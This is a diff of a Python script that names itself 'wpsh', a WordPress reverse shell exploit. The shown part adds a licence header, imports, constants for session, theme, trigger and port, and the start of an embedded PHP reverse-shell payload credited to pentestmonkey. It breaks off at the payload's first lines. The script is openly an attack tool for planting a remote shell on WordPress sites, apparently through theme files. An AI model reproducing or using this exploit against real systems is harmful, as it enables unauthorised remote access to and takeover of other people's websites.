@@ -1,18 +1,50 @@
 #!/usr/bin/env python3
 
+################################################################################
+#                                                                              #
+# Copyright (C) 2024 Brunk (Anas)                                              #
+#                                                                              #
+# wpsh v1.0.0  -  WordPress reverse shell exploit                              #
+#                                                                              #
+#                                                                              #
+#                                                                              #
+# GNU GENERAL PUBLIC LICENSE                                                   #
+#                                                                              #
+# This program is free software: you can redistribute it and/or modify         #
+# it under the terms of the GNU General Public License as published by         #
+# the Free Software Foundation, either version 3 of the License, or            #
+# (at your option) any later version.                                          #
+#                                                                              #
+# This program is distributed in the hope that it will be useful,              #
+# but WITHOUT ANY WARRANTY; without even the implied warranty of               #
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                #
+# GNU General Public License for more details.                                 #
+#                                                                              #
+# You should have received a copy of the GNU General Public License            #
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.        #
+#                                                                              #
+################################################################################
+
 from time import sleep
 from os import system
-from pwn import log
 import threading
 import requests
-import argparse
 import re
 
-TIMEOUT = 2
+from pwn import log
+import argparse
+
+## General
+#
+# program constants
+
 SESSION = requests.Session()
+TIMEOUT = 2
 THEME = ""
 TRIGGER = ""
 PORT = 0
+
+# pentestmonkey reverse shell (https://github.com/pentestmonkey/php-reverse-shell/)
 PAYLOAD = """
 <?php
 set_time_limit (0);
